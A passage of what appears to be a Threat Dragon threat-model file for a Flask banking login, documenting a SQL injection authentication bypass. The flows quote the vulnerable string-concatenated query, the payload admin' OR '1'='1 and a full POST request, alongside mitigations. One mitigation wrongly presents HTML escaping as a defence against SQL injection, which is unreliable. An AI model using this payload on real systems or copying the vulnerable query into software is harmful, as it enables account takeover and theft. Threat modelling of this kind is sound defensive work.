            "ports": {
              "groups": {
                "top": {
                  "position": "top",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "right": {
                  "position": "right",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "bottom": {
                  "position": "bottom",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                },
                "left": {
                  "position": "left",
                  "attrs": {
                    "circle": {
                      "r": 4,
                      "magnet": true,
                      "stroke": "#5F95FF",
                      "strokeWidth": 1,
                      "fill": "#fff",
                      "style": {
                        "visibility": "hidden"
                      }
                    }
                  }
                }
              },
              "items": [
                {
                  "group": "top",
                  "id": "0197d456-7449-40c9-a0d2-890946c3349f"
                },
                {
                  "group": "right",
                  "id": "803cbeed-f195-4eee-ad1d-2a95240a6427"
                },
                {
                  "group": "bottom",
                  "id": "3cff3394-4e42-43bf-ab2f-28d3736a7c08"
                },
                {
                  "group": "left",
                  "id": "86b4c50d-05f0-4aeb-816b-a44c5fec5500"
                }
              ]
            },
            "id": "4195aa25-fc53-4c2a-bfd7-1f56e2cb628f",
            "zIndex": 4,
            "data": {
              "type": "tm.Store",
              "name": "SQLite Database",
              "description": "Database storing user credentials and account information\n   \n   Table: users\n   Columns: user_id, username, password_hash, email, account_balance",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isALog": false,
              "isEncrypted": false,
              "isSigned": false,
              "storesCredentials": false,
              "storesInventory": false,
              "threats": []
            },
            "children": [
              "e9de625f-ba82-438f-9e73-20548068b23d"
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Vulnerable SQL Query (String Concatenation)",
              "description": "VULNERABILITY LOCATION\n   \n   SQL query constructed using dangerous string concatenation\n   \n   Vulnerable Code:\n   query = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n   \n   When Attacker inputs username: admin' OR '1'='1\n   The query becomes:\n   SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n   \n   Result: '1'='1' is always TRUE, bypassing authentication\n   \n   Protocol: SQL\n   Encrypted: NO (internal communication)",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "817c4333-0d0e-40ab-abf0-b4d8a8ac88b0",
                  "title": "SQL Injection in Login Authentication - Bypassing Password Check",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "VULNERABILITY DESCRIPTION:\nThe login endpoint constructs SQL queries using string concatenation instead of parameterized queries, allowing attackers to inject malicious SQL code.\n\nATTACK VECTOR:\nAttacker submits specially crafted input in the username field:\nUsername: admin' OR '1'='1\nPassword: anything\n\nVULNERABLE CODE:\nquery = f\"SELECT * FROM users WHERE username='{username}' AND password='{password}'\"\n\nRESULTING QUERY:\nSELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'\n\nEXPLOITATION:\n- The injected OR '1'='1' makes the WHERE clause always evaluate to TRUE\n- Password check is bypassed\n- Database returns admin user record\n- Application grants authenticated session to attacker\n\nIMPACT:\n- Complete authentication bypass\n- Unauthorized admin access\n- Access to all customer accounts\n- Ability to transfer funds\n- Access to sensitive PII data\n- Potential for privilege escalation",
                  "mitigation": "IMMEDIATE FIXES:\n1. Use Parameterized Queries (Prepared Statements):\n   cursor.execute(\n       \"SELECT * FROM users WHERE username=? AND password=?\", \n       (username, hash_password(password))\n   )\n\n2. Use ORM Framework:\n   user = User.query.filter_by(username=username).first()\n   if user and check_password_hash(user.password, password):\n       login_user(user)\n\n3. Input Validation:\n   - Whitelist allowed characters (alphanumeric + limited special chars)\n   - Reject SQL keywords: SELECT, OR, AND, DROP, etc.\n   - Limit input length: username max 50 chars\n\nADDITIONAL SECURITY LAYERS:\n4. Web Application Firewall (WAF):\n   - Deploy ModSecurity or cloud WAF\n   - Block common SQL injection patterns\n\n5. Rate Limiting:\n   - Max 5 login attempts per IP per minute\n   - Account lockout after 10 failed attempts\n\n6. Database Security:\n   - Apply principle of least privilege\n   - Use read-only user for SELECT queries\n   - Separate user for INSERT/UPDATE/DELETE\n\n7. Monitoring & Logging:\n   - Log all authentication attempts\n   - Alert on suspicious patterns (SQL keywords in input)\n   - Implement SIEM integration\n\n8. Code Review:\n   - Security code review before deployment\n   - Static analysis tools (Bandit, SonarQube)\n   - Regular penetration testing",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 6,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 1,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "Vulnerable SQL Query (String Concatenation)"
            ],
            "id": "aeb8b14e-36cc-42c2-9ed8-4d4ef1875475",
            "source": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "3952c5eb-a031-45cf-8c52-dfb7358dd5a5"
            },
            "target": {
              "cell": "4195aa25-fc53-4c2a-bfd7-1f56e2cb628f",
              "port": "86b4c50d-05f0-4aeb-816b-a44c5fec5500"
            },
            "vertices": [
              {
                "x": 1110,
                "y": 195
              },
              {
                "x": 1150,
                "y": 195
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "red",
                "strokeWidth": 2.5,
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Malicious SQL Injection Payload",
              "description": "HTTP POST request containing SQL injection payload\n   \n   Payload Details:\n   - Username: admin' OR '1'='1\n   - Password: anything\n   - Content-Type: application/x-www-form-urlencoded\n   \n   The payload exploits string concatenation vulnerability in SQL query construction",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": true,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": [
                {
                  "id": "509c88ca-e968-4ec0-8b1a-d5b96507fc14",
                  "title": "Malicious Payload Injection via POST Request",
                  "status": "Open",
                  "severity": "High",
                  "type": "Tampering",
                  "description": "ATTACK VECTOR:\nAttacker crafts malicious HTTP POST request with SQL injection payload embedded in the username field.\n\nPAYLOAD DETAILS:\n- Field: username\n- Malicious Input: admin' OR '1'='1\n- Normal Input Expected: alphanumeric username\n- Attack Type: SQL Injection via input tampering\n\nREQUEST STRUCTURE:\nPOST /auth/login HTTP/1.1\nHost: bank.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1&password=anything\n\nTAMPERING METHOD:\nAttacker tampers with legitimate login request by injecting SQL syntax characters (' OR) that will be interpreted as SQL code instead of data.\n\nTHREAT:\nThe application does not distinguish between user data and SQL commands, allowing attacker to modify the application's SQL query logic.",
                  "mitigation": "INPUT LAYER PROTECTION:\n\n1. Input Validation (Client & Server Side):\n   - Whitelist: Allow only [a-zA-Z0-9_] characters\n   - Length limit: 3-50 characters\n   - Reject special SQL characters: ' \" ; -- /* */ \n\n2. Web Application Firewall (WAF):\n   - Deploy ModSecurity or cloud WAF (Cloudflare, AWS WAF)\n   - Enable OWASP Core Rule Set (CRS)\n   - Block SQL injection patterns\n   - Rate limiting per IP\n\n3. Content Security Policy:\n   - Validate Content-Type header\n   - Reject unexpected content types\n   - Check request origin\n\n4. Request Sanitization:\n   from html import escape\n   username = escape(username)\n   # Converts ' to &apos; preventing SQL injection\n\n5. Logging & Monitoring:\n   - Log all login attempts with full payload\n   - Alert on SQL keywords in input: SELECT, OR, AND, DROP, UNION\n   - Integrate with SIEM (Security Information and Event Management)\n   - Set up anomaly detection\n\n6. HTTPS Enforcement:\n   - Force HTTPS to prevent MITM tampering\n   - HSTS header: Strict-Transport-Security: max-age=31536000\n\n7. CSRF Protection:\n   - Implement CSRF tokens\n   - Validate tokens on every POST request",
                  "modelType": "STRIDE",
                  "new": false,
                  "number": 8,
                  "score": ""
                }
              ],
              "threatFrequency": {
                "tampering": 1,
                "informationDisclosure": 0,
                "denialOfService": 0
              }
            },
            "labels": [
              "Malicious SQL Injection Payload"
            ],
            "id": "540aa1ac-0f4a-4e96-aa7f-73f27b96e940",
            "source": {
              "cell": "ac0a552a-84d4-4657-bb64-8ec10af73ed0",
              "port": "26b6ab31-e752-4a97-883a-91be2433584d"
            },
            "target": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "8dcaf22d-70d0-43f5-adad-49541a9c7c97"
            },
            "vertices": [
              {
                "x": 540,
                "y": 140
              },
              {
                "x": 570,
                "y": 160
              },
              {
                "x": 590,
                "y": 175
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "Query Results (User Record)",
              "description": "Database returns user record to application\n   \n   Returned Data:\n   - user_id: 1\n   - username: admin\n   - email: admin@bank.com\n   - account_type: administrator\n   \n   Due to SQL injection, database returns admin record even with wrong password",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "Query Results (User Record)"
            ],
            "id": "2d518d58-060c-49d0-8665-3318a85ff2ba",
            "source": {
              "cell": "4195aa25-fc53-4c2a-bfd7-1f56e2cb628f",
              "port": "3cff3394-4e42-43bf-ab2f-28d3736a7c08"
            },
            "target": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "3952c5eb-a031-45cf-8c52-dfb7358dd5a5"
            },
            "vertices": [
              {
                "x": 1170,
                "y": 300
              }
            ]
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Response - Unauthorized Access Granted",
              "description": "Application grants authenticated session to attacker\n   \n   Response Details:\n   - Status: 302 Found (Redirect)\n   - Location: /dashboard\n   - Set-Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0...\n   - Body: Redirecting to admin dashboard\n   \n   IMPACT: Attacker now has full admin access to banking system",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP Response - Unauthorized Access Granted"
            ],
            "id": "1a866ff4-0182-4112-a14e-d33ff69e3d09",
            "source": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "09c79237-1bfa-4aca-94bf-11511a356e3a"
            },
            "target": {
              "cell": "ac0a552a-84d4-4657-bb64-8ec10af73ed0",
              "port": "26b6ab31-e752-4a97-883a-91be2433584d"
            },
            "vertices": []
          },
          {
            "shape": "flow",
            "attrs": {
              "line": {
                "stroke": "#333333",
                "targetMarker": {
                  "name": "block"
                },
                "sourceMarker": {
                  "name": ""
                },
                "strokeDasharray": null
              }
            },
            "width": 200,
            "height": 100,
            "zIndex": 10,
            "connector": "smooth",
            "data": {
              "type": "tm.Flow",
              "name": "HTTP Response - Legitimate Login",
              "description": "Normal successful authentication response for legitimate users\nResponse: 302 redirect to /dashboard with session cookie",
              "outOfScope": false,
              "isTrustBoundary": false,
              "reasonOutOfScope": "",
              "hasOpenThreats": false,
              "isBidirectional": false,
              "isEncrypted": false,
              "isPublicNetwork": false,
              "protocol": "",
              "threats": []
            },
            "labels": [
              "HTTP Response - Legitimate Login"
            ],
            "id": "92735b87-2233-436b-900a-b46f5c508bcc",
            "source": {
              "cell": "b8530cee-4bd5-402e-913a-c34ded2e31d1",
              "port": "8dcaf22d-70d0-43f5-adad-49541a9c7c97"
            },
            "target": {
              "cell": "dedcf4c0-3e7c-4492-9451-5db79c8f8803",
              "port": "26b6ab31-e752-4a97-883a-91be2433584d"
            },
            "vertices": []
          },
          {
            "position": {
              "x": 760,
              "y": -230
            },
            "size": {
              "width": 480,
              "height": 210
            },
            "attrs": {
              "text": {
                "text": "SQL INJECTION ATTACK FLOW - BANKING APPLICATION\n\nATTACK SCENARIO:\n1. Attacker accesses login page at /auth/login\n2. Attacker inputs malicious payload: Username = admin' OR '1'='1\n3. Flask app constructs vulnerable SQL query using string concatenation\n4. Database executes injected query, returns admin user record\n5. Attacker receives authenticated session with admin privileges\n6. Attacker gains unauthorized access to banking system\n\nSEVERITY: HIGH | CVSS Score: 9.8 (Critical)\nSTRIDE: Tampering, Information Disclosure, Elevation of Privilege"
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "5e9d8330-6327-4540-b327-7e053af48c79",
            "zIndex": 11,
            "data": {
              "type": "tm.Text",
              "name": "SQL INJECTION ATTACK FLOW - BANKING APPLICATION\n\nATTACK SCENARIO:\n1. Attacker accesses login page at /auth/login\n2. Attacker inputs malicious payload: Username = admin' OR '1'='1\n3. Flask app constructs vulnerable SQL query using string concatenation\n4. Database executes injected query, returns admin user record\n5. Attacker receives authenticated session with admin privileges\n6. Attacker gains unauthorized access to banking system\n\nSEVERITY: HIGH | CVSS Score: 9.8 (Critical)\nSTRIDE: Tampering, Information Disclosure, Elevation of Privilege",
              "hasOpenThreats": false
            }
          },
          {
            "position": {
              "x": 1499.999999999999,
              "y": 85
            },
            "size": {
              "width": 330,
              "height": 340
            },
            "attrs": {
              "text": {
                "text": "IMPACT ANALYSIS:\n\nConfidentiality: HIGH\n- Access to all customer PII\n- View account balances\n- Access transaction history\n\nIntegrity: HIGH  \n- Modify account balances\n- Create fraudulent transactions\n- Alter audit logs\n\nAvailability: MEDIUM\n- Potential for account lockouts\n- Database manipulation\n- Service disruption\n\nFinancial Impact:\n- Direct theft via unauthorized transfers\n- Regulatory fines (GDPR, PCI-DSS)\n- Reputation damage\n- Legal liability"
              }
            },
            "visible": true,
            "shape": "td-text-block",
            "id": "d1bb5030-be33-4151-bf5e-f826358dcd5c",
            "zIndex": 12,
            "data": {
              "type": "tm.Text",
              "name": "IMPACT ANALYSIS:\n\nConfidentiality: HIGH\n- Access to all customer PII\n- View account balances\n- Access transaction history\n\nIntegrity: HIGH  \n- Modify account balances\n- Create fraudulent transactions\n- Alter audit logs\n\nAvailability: MEDIUM\n- Potential for account lockouts\n- Database manipulation\n- Service disruption\n\nFinancial Impact:\n- Direct theft via unauthorized transfers\n- Regulatory fines (GDPR, PCI-DSS)\n- Reputation damage\n- Legal liability",
              "hasOpenThreats": false
            }
          }
        ]
      }
    ],
    "diagramTop": 2,
    "reviewer": "",
    "threatTop": 8
  }
}